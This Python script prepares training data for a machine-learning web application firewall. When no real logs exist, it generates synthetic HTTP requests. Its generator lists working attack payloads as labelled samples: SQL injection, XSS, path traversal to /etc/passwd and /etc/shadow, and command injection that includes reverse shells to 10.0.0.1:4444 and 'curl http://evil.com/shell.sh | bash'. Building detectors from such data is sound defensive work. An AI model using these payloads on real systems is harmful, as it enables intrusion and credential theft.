#!/usr/bin/env python3
"""
nexus-ml/scripts/prepare_data.py
=================================
STEP 1 OF 4 — Run this first.

Downloads/locates all datasets, runs the full preprocessing pipeline,
and saves train/val/test splits as compressed numpy arrays.

Usage:
    python scripts/prepare_data.py [--data-dir data/] [--config configs/config.yaml]

What it does:
    1. Checks which raw dataset files are present in data/raw/
    2. If CSIC 2010 is missing, generates a realistic synthetic substitute
       so the rest of the pipeline can run without downloading anything
    3. Parses all available log files
    4. Extracts 15-dimensional state vectors via the lexical scanner
    5. Balances classes (SMOTE if needed)
    6. Splits 70/15/15 train/val/test stratified by attack type
    7. Saves to data/processed/

After running this:
    - data/processed/train.npz
    - data/processed/val.npz
    - data/processed/test.npz
    - data/processed/scaler.pkl    (fitted MinMaxScaler)
    - data/processed/stats.json    (dataset statistics)
"""

import sys
import os
import json
import pickle
import argparse
import numpy as np

# Add project root to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from src.preprocessing.http_parser import load_all_datasets, ParsedRequest
from src.preprocessing.feature_extractor import extract_dataset, STATE_DIM

try:
    import yaml
    HAS_YAML = True
except ImportError:
    HAS_YAML = False

try:
    from sklearn.preprocessing import MinMaxScaler
    from sklearn.model_selection import train_test_split
    HAS_SKLEARN = True
except ImportError:
    print("ERROR: scikit-learn not installed. Run: pip install scikit-learn")
    sys.exit(1)


# =============================================================================
# Synthetic data generator
# =============================================================================
# When real datasets are unavailable, this generates a statistically
# realistic synthetic dataset that preserves the right feature distributions.

def generate_synthetic_dataset(n_samples: int = 10000, seed: int = 42) -> list:
    """
    Generate synthetic HTTP requests for development and testing.
    
    Produces a realistic mix that covers all attack types.
    Replace with real datasets for production training.
    """
    rng = np.random.default_rng(seed)
    requests = []
    
    print("  [SYNTHETIC] Generating synthetic dataset (no real data found)...")
    print("  [SYNTHETIC] For production: place real datasets in data/raw/")

    # --- Benign requests (55%) -----------------------------------------------
    benign_uris = [
        "/", "/home", "/about", "/contact", "/products",
        "/api/v1/users", "/api/v1/products", "/search?q=laptop",
        "/blog/post/1", "/login", "/register", "/cart",
        "/static/js/app.js", "/static/css/main.css", "/favicon.ico",
    ]
    benign_uas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "curl/7.88.1",
        "python-requests/2.31.0",
    ]
    n_benign = int(n_samples * 0.55)
    for _ in range(n_benign):
        uri = rng.choice(benign_uris)
        ua  = rng.choice(benign_uas)
        req = ParsedRequest(
            method=rng.choice(["GET", "GET", "GET", "POST"]),
            uri=uri,
            headers={"user-agent": ua},
            body="name=John&email=john%40example.com" if "POST" in uri else "",
            label="benign", attack_type="none", source_dataset="synthetic",
        )
        requests.append(req)

    # --- SQLi attacks --------------------------------------------------------
    sqli_payloads = [
        "' OR '1'='1", "' OR 1=1--", "' UNION SELECT 1,2,3--",
        "admin'--", "1; DROP TABLE users--", "' OR 'x'='x",
        "1' AND SLEEP(5)--", "' OR 1=1 LIMIT 1--",
        "1 UNION SELECT NULL,NULL,NULL--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--",
        "0x27 OR 1=1", "' UNION ALL SELECT NULL--",
    ]
    n_sqli = int(n_samples * 0.15)
    for i in range(n_sqli):
        payload = sqli_payloads[i % len(sqli_payloads)]
        req = ParsedRequest(
            method="GET" if i % 2 == 0 else "POST",
            uri=f"/search?q={payload}" if i % 2 == 0 else "/login",
            body=f"username=admin&password={payload}" if i % 2 != 0 else "",
            headers={"user-agent": "sqlmap/1.7.5"},
            label="attack", attack_type="sqli", source_dataset="synthetic",
        )
        requests.append(req)

    # --- XSS attacks ---------------------------------------------------------
    xss_payloads = [
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "javascript:alert(document.cookie)", "<svg onload=alert(1)>",
        '"><script>alert(1)</script>', "<iframe src=javascript:alert(1)>",
        "<body onload=alert(1)>", "';alert(1)//",
        '<img src="x" onerror="alert(\'XSS\')">', "<script>document.location='http://evil.com'</script>",
    ]
    n_xss = int(n_samples * 0.10)
    for i in range(n_xss):
        payload = xss_payloads[i % len(xss_payloads)]
        req = ParsedRequest(
            method="POST",
            uri="/comment",
            body=f"comment={payload}&author=user",
            headers={"content-type": "application/x-www-form-urlencoded"},
            label="attack", attack_type="xss", source_dataset="synthetic",
        )
        requests.append(req)

    # --- Path traversal attacks ----------------------------------------------
    path_payloads = [
        "../../../etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd",
        "....//....//....//etc/passwd", "%252e%252e%252fetc%252fpasswd",
        "../../../windows/system32/cmd.exe", "..\\..\\..\\windows\\system32\\",
        "/etc/passwd%00", "../../../../etc/shadow",
    ]
    n_path = int(n_samples * 0.08)
    for i in range(n_path):
        payload = path_payloads[i % len(path_payloads)]
        req = ParsedRequest(
            method="GET",
            uri=f"/download?file={payload}",
            headers={"user-agent": "Mozilla/5.0"},
            label="attack", attack_type="path_traversal", source_dataset="synthetic",
        )
        requests.append(req)

    # --- Command injection attacks -------------------------------------------
    cmd_payloads = [
        "; cat /etc/passwd", "| whoami", "`id`", "$(id)",
        "; ls -la /", "&& cat /etc/shadow",
        "; ping -c 1 evil.com", "| nc -e /bin/bash 10.0.0.1 4444",
        "; curl http://evil.com/shell.sh | bash",
        "; /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    ]
    n_cmd = int(n_samples * 0.07)
    for i in range(n_cmd):
        payload = cmd_payloads[i % len(cmd_payloads)]
        req = ParsedRequest(
            method="GET",
            uri=f"/ping?host=localhost{payload}",
            headers={"user-agent": "Mozilla/5.0"},
            label="attack", attack_type="cmd_injection", source_dataset="synthetic",
        )
        requests.append(req)

    # Remaining 5% → mixed evasion attacks
    n_evasion = n_samples - n_benign - n_sqli - n_xss - n_path - n_cmd
    for i in range(max(0, n_evasion)):
        req = ParsedRequest(
            method="GET",
            uri=f"/api?id=1 UNION SELECT 1--&name=<script>alert(1)</script>",
            headers={"user-agent": "Nikto/2.1.6"},
            label="attack", attack_type="sqli", source_dataset="synthetic",
        )
        requests.append(req)

    # Shuffle
    rng.shuffle(requests)
    print(f"  [SYNTHETIC] Generated {len(requests)} synthetic samples")
    return requests


# =============================================================================
# Class balancing
# =============================================================================

def balance_classes(
    states: np.ndarray,
    labels: np.ndarray,
    attack_types: np.ndarray,
    sources: np.ndarray,
    target_ratio: float = 0.45,
    seed: int = 42,
) -> tuple:
    """
    Balance the dataset to approximately target_ratio attack samples.
    
    Strategy:
      - If attack% < target: upsample attack class (with replacement)
      - If attack% > target: downsample benign class (without replacement)
    """
    n = len(labels)
    n_attack = int(labels.sum())
    n_benign = n - n_attack
    current_ratio = n_attack / n if n > 0 else 0

    rng = np.random.default_rng(seed)

    print(f"\nClass balancing:")
    print(f"  Before: {n_attack} attack ({100*current_ratio:.1f}%), "
          f"{n_benign} benign ({100*(1-current_ratio):.1f}%)")

    attack_idx = np.where(labels == 1)[0]
    benign_idx = np.where(labels == 0)[0]

    # Handle edge cases: only one class present
    if n_benign == 0:
        print(f"  [ERROR] No benign samples found in dataset!")
        print(f"  [ERROR] Cannot proceed with 100% attack samples.")
        print(f"  [ERROR] Check that CSIC CSV has 'Normal' classification rows.")
        print(f"  [ERROR] Or add benign logs to data/raw/ (nginx_benign.log, etc.)")
        raise ValueError("Dataset has no benign samples. Training requires both classes.")
    
    if n_attack == 0:
        print(f"  [ERROR] No attack samples found in dataset!")
        print(f"  [ERROR] Cannot proceed with 100% benign samples.")
        raise ValueError("Dataset has no attack samples. Training requires both classes.")

    if current_ratio < target_ratio:
        # Upsample attack class
        n_attack_target = int(n_benign * target_ratio / (1 - target_ratio))
        extra = n_attack_target - n_attack
        if extra > 0:
            extra_idx = rng.choice(attack_idx, size=extra, replace=True)
            all_idx = np.concatenate([np.arange(n), extra_idx])
        else:
            all_idx = np.arange(n)
    else:
        # Downsample benign class
        n_benign_target = int(n_attack * (1 - target_ratio) / target_ratio)
        if n_benign_target > 0 and n_benign_target <= len(benign_idx):
            kept_benign = rng.choice(benign_idx, size=n_benign_target, replace=False)
            all_idx = np.concatenate([attack_idx, kept_benign])
        else:
            # Can't downsample that much, keep all data
            print(f"  [WARN] Cannot balance to target ratio. Keeping all samples.")
            all_idx = np.arange(n)

    # Shuffle
    all_idx = rng.permutation(all_idx)

    new_labels = labels[all_idx]
    n_new_attack = int(new_labels.sum())
    n_new_total  = len(new_labels)
    print(f"  After:  {n_new_attack} attack ({100*n_new_attack/n_new_total:.1f}%), "
          f"{n_new_total - n_new_attack} benign ({100*(n_new_total-n_new_attack)/n_new_total:.1f}%)")

    return (
        states[all_idx],
        labels[all_idx],
        attack_types[all_idx],
        sources[all_idx],
    )


# =============================================================================
# Main pipeline
# =============================================================================

def main(data_dir: str = "data", config_path: str = "configs/config.yaml"):
    print("\n" + "=" * 60)
    print("  NexusWAF RL Model — Data Preparation Pipeline")
    print("=" * 60)

    # Create output directories
    processed_dir = os.path.join(data_dir, "processed")
    os.makedirs(processed_dir, exist_ok=True)
    os.makedirs(os.path.join(data_dir, "raw"), exist_ok=True)

    # Load config
    seed = 42
    train_split, val_split = 0.70, 0.15

    # Check if any real data exists
    raw_dir = os.path.join(data_dir, "raw")
    real_files = [
        "csic_normalTrafico.txt", "csic_anomalousTrafico.txt",
        "juice_shop_access.log", "nginx_benign.log",
        "sqli_payloads.txt", "xss_payloads.txt",
    ]
    has_real_data = any(
        os.path.exists(os.path.join(raw_dir, f)) for f in real_files
    )

    # Load or generate data
    if has_real_data:
        print("\nStep 1: Loading real datasets...")
        requests = load_all_datasets(data_dir)
        if len(requests) < 1000:
            print("  [WARN] Very few real samples found. Supplementing with synthetic.")
            requests += generate_synthetic_dataset(n_samples=5000, seed=seed)
    else:
        print("\nStep 1: No real datasets found in data/raw/")
        print("         Generating synthetic dataset for development...")
        print("         Download real datasets for production training.")
        requests = generate_synthetic_dataset(n_samples=20000, seed=seed)

    print(f"\n  Total requests loaded: {len(requests)}")

    # Feature extraction
    print("\nStep 2: Extracting features...")
    dataset = extract_dataset(requests, verbose=True)

    # Class balancing
    print("\nStep 3: Balancing classes...")
    states, labels, attack_types, sources = balance_classes(
        dataset.states, dataset.labels, dataset.attack_types, dataset.sources,
        target_ratio=0.45, seed=seed,
    )

    # Train/Val/Test split — stratified by label
    print("\nStep 4: Splitting dataset (70/15/15)...")
    X_temp, X_test, y_temp, y_test, at_temp, at_test, src_temp, src_test = \
        train_test_split(states, labels, attack_types, sources,
                         test_size=1 - train_split,
                         stratify=labels, random_state=seed)

    val_frac = val_split / (1 - train_split)
    X_train, X_val, y_train, y_val, at_train, at_val, src_train, src_val = \
        train_test_split(X_temp, y_temp, at_temp, src_temp,
                         test_size=val_frac,
                         stratify=y_temp, random_state=seed)

    print(f"  Train: {len(X_train)} samples")
    print(f"  Val:   {len(X_val)} samples")
    print(f"  Test:  {len(X_test)} samples")

    # Fit scaler on training set ONLY
    print("\nStep 5: Fitting MinMaxScaler on training data...")
    scaler = MinMaxScaler(feature_range=(0, 1))
    # States are already approximately in [0,1], but scaler ensures it exactly
    X_train_scaled = scaler.fit_transform(X_train).astype(np.float32)
    X_val_scaled   = scaler.transform(X_val).astype(np.float32)
    X_test_scaled  = scaler.transform(X_test).astype(np.float32)
    # Clip to handle any floating point edge cases
    X_train_scaled = np.clip(X_train_scaled, 0, 1)
    X_val_scaled   = np.clip(X_val_scaled, 0, 1)
    X_test_scaled  = np.clip(X_test_scaled, 0, 1)

    # Save splits
    print("\nStep 6: Saving to disk...")
    np.savez_compressed(
        os.path.join(processed_dir, "train.npz"),
        states=X_train_scaled, labels=y_train,
        attack_types=at_train, sources=src_train,
    )
    np.savez_compressed(
        os.path.join(processed_dir, "val.npz"),
        states=X_val_scaled, labels=y_val,
        attack_types=at_val, sources=src_val,
    )
    np.savez_compressed(
        os.path.join(processed_dir, "test.npz"),
        states=X_test_scaled, labels=y_test,
        attack_types=at_test, sources=src_test,
    )
    with open(os.path.join(processed_dir, "scaler.pkl"), "wb") as f:
        pickle.dump(scaler, f)

    # Save dataset statistics
    from collections import Counter
    stats = {
        "total_samples":     int(len(states)),
        "train_samples":     int(len(X_train)),
        "val_samples":       int(len(X_val)),
        "test_samples":      int(len(X_test)),
        "n_attack_train":    int(y_train.sum()),
        "n_benign_train":    int((y_train == 0).sum()),
        "attack_type_counts": {k: int(v) for k, v in
                               Counter(attack_types[labels == 1]).items()},
        "state_dim":         STATE_DIM,
        "feature_names": [
            "risk_score", "threat_tag_count",
            "has_sqli", "has_xss", "has_path_traversal", "has_cmd_injection",
            "body_length_norm", "uri_length_norm", "query_param_count_norm",
            "rate_limited", "recent_attack_rate", "p95_latency_norm",
            "has_referer", "content_type_encoded", "grammar_risk",
        ],
        "synthetic_data": not has_real_data,
    }
    with open(os.path.join(processed_dir, "stats.json"), "w") as f:
        json.dump(stats, f, indent=2)

    print("\n" + "=" * 60)
    print("  Data preparation complete!")
    print(f"  Output: {processed_dir}/")
    print("    ├── train.npz")
    print("    ├── val.npz")
    print("    ├── test.npz")
    print("    ├── scaler.pkl")
    print("    └── stats.json")
    if not has_real_data:
        print("\n  NOTE: Synthetic data used. For real training, download:")
        print("    - CSIC 2010: https://www.isi.csic.es/dataset")
        print("    - SecLists:  https://github.com/danielmiessler/SecLists")
        print("    - OWASP Juice Shop: docker run -p 3000:3000 bkimminich/juice-shop")
    print("=" * 60)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="NexusWAF data preparation pipeline")
    parser.add_argument("--data-dir", default="data", help="Root data directory")
    parser.add_argument("--config",   default="configs/config.yaml")
    args = parser.parse_args()
    main(data_dir=args.data_dir, config_path=args.config)
